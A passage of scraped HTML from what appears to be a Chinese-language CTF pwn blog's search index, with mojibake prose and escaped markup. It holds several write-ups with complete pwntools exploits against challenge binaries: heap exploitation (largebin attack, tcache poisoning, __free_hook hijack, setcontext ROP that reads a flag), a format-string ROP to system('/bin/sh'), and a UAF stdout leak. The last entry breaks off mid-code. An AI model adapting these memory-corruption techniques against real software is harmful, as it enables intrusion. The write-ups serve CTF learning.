&lt;img src=&#34;https://oraclepi.tech/post-images/1687500325143.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å› æ­¤ä¹‹åé‡Šæ”¾çš„åœ¨largebinå¤§å°èŒƒå›´çš„å †å—ä¹Ÿä¼šè¢«tcachebinç®¡è¾–&lt;br&gt;
å› æ­¤å¯ä»¥æ‰“tcachebin posioningï¼Œå¯ä»¥åŠ«æŒ&lt;code&gt;__free_hook&lt;/code&gt;&lt;br&gt;
ç”±äºåªèƒ½æ‰“orwï¼Œglibc 2.32ç‰ˆæœ¬ä¸‹é€‰æ‹©ä½¿ç”¨&lt;code&gt;setcontext+61&lt;/code&gt;åŠ«æŒç¨‹åºæµ&lt;br&gt;
&lt;code&gt;mov rsp,[rdx+0A0h]&lt;/code&gt;å¯ä»¥åŠ«æŒrspå¯„å­˜å™¨ï¼Œè¿›è€Œè¾¾åˆ°æ§åˆ¶ç¨‹åºæµçš„ç›®çš„&lt;br&gt;
è€Œæˆ‘ä»¬ä½¿ç”¨å¦å¤–ä¸€ä¸ªgadgetï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;
mov rdx, qword ptr [rdi + 8] ;
mov qword ptr [rsp], rax ;
call qword ptr [rdx + 0x20]

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥å®ç°è°ƒç”¨&lt;code&gt;[rdx+0x20]&lt;/code&gt;å¤„çš„æŒ‡ä»¤çš„ä½œç”¨ï¼Œ&lt;br&gt;
è°ƒç”¨&lt;code&gt;__free_hook&lt;/code&gt;æ—¶å°†ä¼ å…¥çš„åœ°å€ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥rdi&lt;br&gt;
å› æ­¤æˆ‘ä»¬å¯ä»¥å°†è¦deleteçš„å †å—ä¸­å¡«å…¥&lt;code&gt;p64(0)+p64(addr)&lt;/code&gt;ï¼Œå°†addrçš„å€¼ä¼ å…¥rdxå¯„å­˜å™¨ä¸­ï¼Œæœ€ç»ˆè°ƒç”¨&lt;code&gt;[addr+0x20]&lt;/code&gt;çš„æŒ‡ä»¤ï¼Œå‘è¯¥åœ°å€å¡«å…¥&lt;code&gt;setcontext+61&lt;/code&gt;çš„åœ°å€&lt;br&gt;
åœ¨å½“å‰payloadçš„0xa0åç§»å¤„å¸ƒç½®orwåœ°å€ï¼Œå¯ä»¥åŠ«æŒrspå¯„å­˜å™¨åˆ°orw ropé“¾ä¸Šï¼Œä¸è¦å¿˜äº†orwåè·Ÿä¸ªretåœ°å€æ¥å¼¹æ ˆæ‰§è¡Œ&lt;/p&gt;
&lt;p&gt;æ­¤é¢˜éœ€è¦æ³¨æ„ç”³è¯·å †å—å¤§å°åœ¨largebinèŒƒå›´å†…ï¼Œè€Œ&lt;code&gt;tcachebin-&amp;gt;next&lt;/code&gt;çš„æŒ‡é’ˆå¼‚æˆ–åŠ å¯†åœ¨æ¯0x1000çš„èŒƒå›´å†…ç›¸åŒï¼ˆ&amp;gt;&amp;gt;12æ­£å¥½æŠ¹å»æœ«ä¸‰ä½ï¼‰ï¼Œæ‰€ä»¥å¤§äº0x1000çš„æƒ…å†µå¾ˆå®¹æ˜“å‡ºç°ï¼Œå› æ­¤å¯ä»¥ç›´æ¥ç”¨nextæŒ‡é’ˆå¼‚æˆ–ç›®æ ‡åœ°å€æ¥ç»•è¿‡æ£€æŸ¥&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mp_.tcache_bins&lt;/code&gt;çš„åç§»å¯ä»¥ç›´æ¥&lt;code&gt;vmmap&lt;/code&gt;æ‰¾å‡ºå †åŸºå€&lt;br&gt;
ç„¶åä½¿ç”¨&lt;code&gt;search -8 å †åŸºå€&lt;/code&gt;&lt;br&gt;
åœ¨libc.soä¸Šçš„åœ°å€+0x8å³æ˜¯çœŸå®åœ°å€&lt;br&gt;
åç§»&lt;code&gt;dist&lt;/code&gt;å³å¯&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28878)
io=process(&amp;quot;./vuln&amp;quot;)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

#sandbox on  
def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

### leak libc
add(0,0x560) #0
add(14,0x540) #14
add(1,0x540) #1
delete(0)
edit(0,b&amp;quot;A&amp;quot;)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-65-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
###

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
setcontext_61=leak_addr+libc.sym[b&amp;quot;setcontext&amp;quot;]+61
mprotect=leak_addr+libc.sym[b&amp;quot;mprotect&amp;quot;]
mp_=leak_addr+0x1e32d0
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
pop_rsi=leak_addr+0x2ac3f
pop_rdi=leak_addr+0x2858f
pop_rdx_r12=leak_addr+0x114161
pop_rax=leak_addr+0x45580
ret=leak_addr+0x26699

magic_gadget=leak_addr+0x14b760 
&#39;&#39;&#39;
mov rdx, qword ptr [rdi + 8] ;
mov qword ptr [rsp], rax ;
call qword ptr [rdx + 0x20]
&#39;&#39;&#39;

### leak heap
edit(0,b&amp;quot;\x00&amp;quot;)
add(2,0x900) #2
edit(0,b&amp;quot;A&amp;quot;*0xf+b&amp;quot;B&amp;quot;)
show(0)
io.recvuntil(b&amp;quot;B&amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x290
key=heap_addr&amp;gt;&amp;gt;12
ck_next=heap_addr+0x24d0
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))
print(&amp;quot;key: &amp;quot;,hex(key))
###


### largebin attack
payload=p64(leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+0x70)*2
payload+=p64(mp_-0x20)*2
edit(0,payload)

delete(1)
add(3,0x900) #3
###

### hijack __free_hook
add(4,0x900) #4
add(5,0x900) #5

delete(5)
delete(4)
edit(4,p64((ck_next&amp;gt;&amp;gt;12)^free_hook))
add(4,0x900)
add(5,0x900)
edit(5,p64(magic_gadget))
###
stack_addr=heap_addr+0x36f0
orw_addr=heap_addr+0x3f00


#open
orw=p64(pop_rdi)+p64(stack_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(write_a)


stack=b&amp;quot;./flag\x00\x00&amp;quot;+p64(0)*3+p64(setcontext_61)
stack=stack.ljust(0xa0,b&amp;quot;\x00&amp;quot;)
stack+=p64(orw_addr)+p64(ret)

add(6,0x800) #6
edit(6,stack)

add(7,0x800) #7
edit(7,orw)

# gdb.attach(io)
# pause()

add(8,0x700) #8
edit(8,p64(0)+p64(stack_addr))
delete(8)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HGAME week3 å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/snl1IsNFg/"" data-c="
          &lt;p&gt;&lt;s&gt;è€ƒå®Œæ•°åŸºæ„Ÿè§‰åœ¨æŒ‚ç§‘è¾¹ç¼˜&lt;/s&gt;&lt;br&gt;
åšä¸€é“éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå½“ä½œåŠ æ·±æ­¤ç±»é¢˜ç›®å°è±¡&lt;br&gt;
æ­¤é¢˜ä½¿ç”¨glibcç‰ˆæœ¬ 2.35-0ubuntu3.1ï¼Œé«˜ç‰ˆæœ¬ä¸‹ç›´æ¥retæ‰“one_gadgeté™åˆ¶è¾ƒå¤š&lt;br&gt;
æ­¤é¢˜é‡‡ç”¨å‘retåœ°å€å†™å…¥ropé“¾æ¥å–å¾—shell&lt;br&gt;
éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²é‡‡ç”¨éš”ç©ºæ‰“ç‰›çš„æ–¹æ³•ï¼ŒæŒ‰ç…§è¿™æ ·çš„è§„åˆ™æ‰¾åç§»å³å¯&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1687157672853.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ­¤é¢˜æ˜¯æ— é™å¾ªç¯ï¼Œå¯ä»¥ä¸ç”¨è€ƒè™‘å†™å…¥æ¬¡æ•°çš„é—®é¢˜&lt;br&gt;
ä½†æ˜¯æ­¤é¢˜è‡ªå®šä¹‰çš„å‡½æ•°å¿…é¡»ä¿è¯æ¯ä¸€æ¬¡å†™å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ç›¸åŒï¼Œå¦åˆ™ä¼šå‡ºç°å†™å­—èŠ‚ä¸å¤Ÿæˆ–è€…è¶…å‡ºèŒƒå›´å†™&lt;code&gt;\x01&lt;/code&gt;çš„é—®é¢˜ï¼ˆå…¶å®ä¸ç”¨è‡ªå®šä¹‰å‡½æ•°å°±æ²¡é—®é¢˜äº†&lt;br&gt;
å¦‚ä¸‹å›¾retåœ°å€å†™å…¥å‡ºé”™ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1687157529064.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28950)
# io=process(&amp;quot;./fmtstr&amp;quot;)
elf=ELF(&amp;quot;./fmtstr&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

io.sendlineafter(b&amp;quot;answer: \n&amp;quot;,b&amp;quot;y&amp;quot;)

#leak libc
io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
payload=b&amp;quot;%29$p&amp;quot;
io.send(payload)
leak_addr=int(io.recv(14),16)-128-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]
print(&amp;quot;leak_addr:&amp;quot;,hex(leak_addr))

# ret=0x40101a
ret=leak_addr+0x29cd6
pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

# gdb.attach(io)
# pause()

#leak stack
io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
payload=b&amp;quot;%13$p&amp;quot;
io.send(payload)
stack_addr=int(io.recv(14),16)
print(&amp;quot;stack_addr:&amp;quot;,hex(stack_addr))
ret_addr=stack_addr-0x110
print(&amp;quot;ret_addr:&amp;quot;,hex(ret_addr))

def fmt_t(addr,ctt,off1,off2):
    io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,off1))
    io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format(ctt&amp;amp;0xff,off2))
    
    for i in range(5):
        io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+i+1)&amp;amp;0xff,off1))
        io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((ctt&amp;gt;&amp;gt;((i+1)*8))&amp;amp;0xff,off2))

fmt_t(ret_addr,ret,13,43)
fmt_t(ret_addr+0x8,pop_rdi,13,43)
fmt_t(ret_addr+0x10,str_sh,13,43)
fmt_t(ret_addr+0x18,sys_addr,13,43)

print(&amp;quot;ret_addr:&amp;quot;,hex(ret_addr))
print(&amp;quot;ret:&amp;quot;,hex(ret))
print(&amp;quot;pop_rdi:&amp;quot;,hex(pop_rdi))
print(&amp;quot;str_sh:&amp;quot;,hex(str_sh))
print(&amp;quot;sys_addr:&amp;quot;,hex(sys_addr))

io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK4]fmtstr_level4 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/7WbYV0o_m/"" data-c="
          &lt;p&gt;æŠ•æœºå–å·§äº†ï¼Œåœ¨nssä¸Šå¤ç°çš„ç›´æ¥çŒœç›®å½•äº†&lt;br&gt;
å¯ä»¥ç”¨&lt;code&gt;mprotect&lt;/code&gt;å¼€rwxæ®µï¼Œä¹Ÿå¯ä»¥ç›´æ¥orw_rop&lt;br&gt;
å¼€å¯æ²™ç›’ç¦ç”¨å¸¸è§ç¦ç”¨çš„è°ƒç”¨ï¼Œè¿˜æœ‰&lt;code&gt;openat&lt;/code&gt;ï¼Œä¸èƒ½ç”¨&lt;code&gt;open&lt;/code&gt;åº“å‡½æ•°ï¼Œsyscallå¯ä»¥&lt;br&gt;
æ³¨æ„ç”¨&lt;code&gt;syscall;ret&lt;/code&gt;&lt;br&gt;
åŠæˆå“expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28413)
# io=process(&amp;quot;./service&amp;quot;)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;libc2.so&amp;quot;)

leave_ret=0x4012c8
pop_rdi=0x401443
pop_rsi_r15=0x401441
bss_addr=0x404060+0x900 

io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;?\n&amp;quot;)


payload=cyclic(0x38)+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(elf.got[b&amp;quot;write&amp;quot;])+p64(0)+p64(elf.plt[b&amp;quot;write&amp;quot;])+p64(0x401311)
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;write&amp;quot;]
print(&amp;quot;leak_addr:&amp;quot;,hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
mprotect_a=leak_addr+libc.sym[b&amp;quot;mprotect&amp;quot;]
pop_rsi=leak_addr+0x23eea
pop_rdx=leak_addr+0x1b96
pop_rax=leak_addr+0x43ae8
# syscall=leak_addr+0x13c0
syscall_ret=leak_addr+0xd2745

# gdb.attach(io)
# pause()

# # mprotect()
# io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
# io.recvuntil(b&amp;quot;?\n&amp;quot;)
# payload=cyclic(0x38)+p64(pop_rdi)+p64(0x404000)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)+p64(7)+p64(mprotect_a)+p64(elf.sym[b&amp;quot;read&amp;quot;])+p64(0x401311)
# io.send(payload)

#open
# orw=p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
orw=p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss_addr+0x200)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss_addr+0x200)+p64(pop_rdx)+p64(0x50)+p64(write_a)

io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;?\n&amp;quot;)
payload=cyclic(0x38)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_addr)+p64(pop_rdx)+p64(0x50)+p64(elf.sym[b&amp;quot;read&amp;quot;])+p64(0x401311)
io.send(payload)
io.send(b&amp;quot;./flag&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;?\n&amp;quot;)
payload=cyclic(0x38)+orw
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040143c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040143e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401440 : pop r14 ; pop r15 ; ret
# 0x0000000000401442 : pop r15 ; ret
# 0x000000000040143b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040143f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401443 : pop rdi ; ret
# 0x0000000000401441 : pop rsi ; pop r15 ; ret
# 0x000000000040143d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x00000000004012b2 : ret 0x2be
# 0x00000000004013ae : ret 0x8d48

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">2022_hgame_oldfashion_orw</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/bcvKCEmR-/"" data-c="
          &lt;p&gt;&lt;s&gt;å¤ä¹ ä¸å®Œäº†æ²ƒæ—¥&lt;/s&gt;&lt;br&gt;
glibc 2.31-0ubuntu9.8ï¼Œç¼ºå°‘&lt;code&gt;edit()&lt;/code&gt;çš„èœå•é¢˜&lt;br&gt;
æœ‰æ²™ç›’ä¿æŠ¤ç¦ç”¨äº†&lt;code&gt;execve()&lt;/code&gt;ï¼Œå¹¶ä¸”ç¨‹åºç¦ç”¨äº†&lt;code&gt;__malloc_hook&lt;/code&gt;å’Œ&#39;__free_hook&#39;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686898228404.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ­¤é¢˜ä¾æ—§æ‰“å †æ ˆç»“åˆçš„orw ropï¼Œä¸è¿‡æ­¤é¢˜æœ‰ä¸”ä»…æœ‰ä¸€æ¬¡uafçš„æœºä¼šåœ¨&lt;code&gt;case 666&lt;/code&gt;ä¸­ï¼Œ&lt;code&gt;show()&lt;/code&gt;ä¹Ÿåªèƒ½ä½¿ç”¨ä¸€æ¬¡ï¼Œå¯ä»¥å°†è¿™ä¸€æ¬¡æœºä¼šç”¨æ¥æ³„éœ²libc&lt;br&gt;
ä¸è¿‡æ‰“å †æ ˆç»“åˆçš„ropä»éœ€çŸ¥é“æ ˆåœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥è€ƒè™‘åŠ«æŒå †åˆ°&lt;code&gt;_IO_2_1_stdout&lt;/code&gt;å¤„æ³„éœ²&lt;code&gt;__environ&lt;/code&gt;å­˜å‚¨çš„æ ˆåœ°å€ï¼Œä¹‹åæµ‹ç®—åˆ°&lt;code&gt;add()&lt;/code&gt;çš„retåœ°å€åç§»ä¸º0x120ï¼Œæˆ‘ä»¬å¯ä»¥åŠ«æŒåˆ°&lt;code&gt;ret-0x128&lt;/code&gt;å¤„,ä¸º&lt;code&gt;./flag\x00\x00&lt;/code&gt;é¢„ç•™ç©ºé—´&lt;br&gt;
æ­¤é¢˜éº»çƒ¦çš„æ˜¯overlap chunkçš„åˆ›å»º&lt;br&gt;
å¯è§expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28678)
io=process(&amp;quot;./pwn&amp;quot;)   #ç¦ç”¨hookï¼Œç¦ç”¨execve
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def add(s,cc): #æœ€å¤§0x90
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: \n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content: \n&amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: \n&amp;quot;,str(n))

def show(n):    #åªèƒ½ä½¿ç”¨ä¸€æ¬¡
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: \n&amp;quot;,str(n))

def gt(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;666&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: \n&amp;quot;,str(n))

gdb.attach(io)
pause()

for i in range(9):
    add(0x90,b&amp;quot;aaa&amp;quot;)  #ä¸ºäº†åç»­æ„é€ overlap chunkå¤šåˆ†é…ä¸€ä¸ªå †å—
    
add(0x90,b&amp;quot;bbb&amp;quot;) #9

for i in range(7):
    delete(i)

gt(8)
show(8)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x60-0x1ECB80
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))


open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
stdout=leak_addr+libc.sym[b&amp;quot;_IO_2_1_stdout_&amp;quot;]
pop_rdi=leak_addr+0x23b6a 
pop_rdx=leak_addr+0x142c92
pop_rax=leak_addr+0x36174
pop_rsi=leak_addr+0x2601f 
ret=leak_addr+0x22679


delete(7) #chunk 7ä¸unsortedbinåˆå¹¶  chunk overlap
add(0x90,b&amp;quot;zzz&amp;quot;) #0 å°†tcachebinæ•°é‡å‡å°‘åˆ°6ï¼Œä¸ºunsortedbiné¢„ç•™tcachebin


delete(8) #UAFå°†unsortedbinæ”¾å…¥tcachebinä¸­
add(0x80,b&amp;quot;aaa&amp;quot;) #1
add(0x80,p64(0)+p64(0xa1)+p64(stdout)) #2
add(0x90,b&amp;quot;eee&amp;quot;) #3
add(0x90,p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8)*2) #4

stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

ret_addr=stack_addr-0x128 #åç§»ä¸º0x120ï¼Œé¢å¤–çš„0x8å†™./flagå­—ç¬¦ä¸²

#open
orw=b&amp;quot;./flag\x00\x00&amp;quot;+p64(pop_rdi)+p64(ret_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack_addr+0x200)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rdx)+p64(0x50)+p64(write_a)
#æ³¨æ„orwé“¾é•¿åº¦ä¸èƒ½å¤§äºåˆ›å»ºå †å—çš„å¤§å°

delete(3) 
delete(2) #é‡Šæ”¾å †å—å†æ¬¡overlap

add(0x80,p64(0)+p64(0xa1)+p64(ret_addr))
add(0x90,b&amp;quot;eee&amp;quot;)

# gdb.attach(io)
# pause()

add(0x90,orw)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 åä¸œåŒ—]blue wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/AEGN0vH7Z/"" data-c="
          &lt;p&gt;glibcç‰ˆæœ¬2.33-0ubuntu5&lt;br&gt;
seccomp dumpå‘ç°ç¦ç”¨&lt;code&gt;execve()&lt;/code&gt;ï¼Œæ‰“orw rop&lt;br&gt;
æœ¬é¢˜æ³„éœ²libcåœ°å€çš„æ—¶å€™ä½å­—èŠ‚ä¸º&lt;code&gt;\x00&lt;/code&gt;å­˜åœ¨00æˆªæ–­ï¼Œéœ€è¦ä¿®æ”¹ä½å­—èŠ‚æ³„éœ²ï¼Œåç»­å‡å»å³å¯&lt;br&gt;
å…¶å®ƒè·Ÿduckå·®ä¸å¤šï¼ŒåŠ«æŒ&lt;code&gt;edit()&lt;/code&gt;çš„retæ‰“one_gadget&lt;br&gt;
å…¶ä¸­&lt;code&gt;__environ&lt;/code&gt;æ³„éœ²çš„&lt;code&gt;stack_addr&lt;/code&gt;è·ç¦»retä¸º0x120&lt;br&gt;
ä¸è¿‡è·Ÿduckä¸€æ ·éœ€è¦é¢å¤–0x18æ‰èƒ½æ­£å¸¸åˆ†é…åˆ°ç›®æ ‡åœ°å€ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686837300331.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686837312166.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¦å¤–æ­¤é¢˜çš„&lt;code&gt;pop rdx;ret&lt;/code&gt;æŒ‡ä»¤çš„åç§»åœ¨ä¸åŒæ‰¾å¯»æ–¹æ³•ä¸‹åç§»ä¼šä¸ä¸€æ ·ï¼Œè€Œä¸”å¦‚æœç›´æ¥ç”¨&lt;br&gt;
&lt;code&gt;leak_addr+next(libc.search(asm(&amp;quot;pop rdx;ret&amp;quot;)))&lt;/code&gt;ä¼šå´©æºƒ&lt;br&gt;
ä½†æ˜¯å¦‚æœæ‰‹åŠ¨æ‰¾è¯¥gadgetåœ¨libcæ–‡ä»¶ä¸­åç§»å†åŠ ä¸ŠåŸºå€åˆ™ä¸ä¼šå‡ºç°é—®é¢˜ï¼ˆé›¾&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28257)
io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)


def add():
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;1&amp;quot;) #0x100
    
def delete(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))

def edit(n,s,cc):
